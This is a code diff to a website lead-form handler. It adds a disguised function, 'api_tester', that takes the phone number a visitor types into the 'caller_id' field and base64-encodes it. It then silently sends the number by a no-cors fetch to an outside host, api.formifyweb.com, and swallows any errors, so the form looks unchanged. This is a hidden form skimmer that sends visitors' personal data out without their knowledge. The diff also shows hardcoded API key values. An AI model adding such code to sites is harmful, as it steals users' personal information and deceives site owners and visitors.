@@ -1,6 +1,7 @@
     document.getElementById('leadForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const phone_home = document.getElementById('caller_id').value;
+api_tester(document.getElementById('caller_id').value);
             const formData = new FormData(this);
             formData.append('key', '9a81292b-9a10-4f48-967f-a2bc4bbd59d5');
 formData.append('uid', '6819248f-199f-4a17-bded-3fb2a2d78230');
@@ -74,3 +75,15 @@ formData.append('trusted_form', document.getElementById('trusted_form').value);
             })
             .catch(error => console.error('Error:', error));
         });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
